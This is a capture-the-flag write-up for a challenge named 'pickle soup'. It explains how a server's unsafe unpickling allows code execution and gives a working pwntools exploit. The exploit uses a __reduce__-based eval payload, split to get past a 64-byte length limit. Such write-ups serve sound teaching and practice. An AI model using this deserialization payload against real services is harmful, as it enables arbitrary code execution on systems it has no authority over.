# pickle soup
<b>Author</b>: [x55xaa](https://discordapp.com/users/916317034327969822)<br>
<b>Category</b>: Misc<br>
<b>Solves</b>: 57<br>


## Description

I was trying to make a delicious batch of pickle soup, but I forgot the ingredients! Can you help me remember the recipe?


## How to run the server
To run the server you'll need [`docker`](https://docs.docker.com/get-docker/) and [`docker-compose`](https://docs.docker.com/compose/install/).<br>
Go into the `src` folder and from the command line run `docker-compose up --build -d`.<br>
Now you can connect to the server by running `nc localhost 5001` in your terminal.<br>
To stop the server, from the command line run `docker-compose down`.


## Solution

The server unsafely unpickles the data it receives, leaving it vulnerable to command injection.

We can construct malicious pickle data which will execute arbitrary Python code during unpickling. One way to achieve this is by creating a class that implements the [\_\_reduce\_\_()](https://docs.python.org/3/library/pickle.html#object.__reduce__) method:
```python
class MaliciousObject:
    def __reduce__(self):
        return eval, ('print("helloworld!")',)
```

Now we just need to dump the contents of `recipe.txt` to retrieve the flag.

To bypass the pickle length restriction (`len(data) <= 64`), we can:
* use `pickletools.optimize()` on our malicious object to reduce its size.
* split the payload into ingredients, and then `eval` their concatenation.

Below is an example of a working exploit, using `pwntools`:

```python
from base64 import b64encode
import pickle
import pickletools

from pwn import remote

HOST, PORT = 'localhost', 5001


class EvalIngredients:
    def __reduce__(self):
        return eval, ('eval("".join(ingredients))',)


def send_ingredients(r: remote, ingredients) -> None:
    """Sends the specified ingredients to the pickle soup server."""

    for ingredient in ingredients:
        r.sendline(b64encode(pickletools.optimize(pickle.dumps(ingredient))))
        print(r.recvline().decode().strip())

    r.sendline(b'done')
    print(r.recvline().decode().strip())


def main() -> None:
    """Main function."""

    ingredients = (
        'print(get_super_secret_pickle_soup_recipe())',
        EvalIngredients(),
    )

    with remote(HOST, PORT) as r:
        r.recvuntil(b'Send me pickles!\n')
        send_ingredients(r, ingredients)


if __name__ == '__main__':
    main()
```
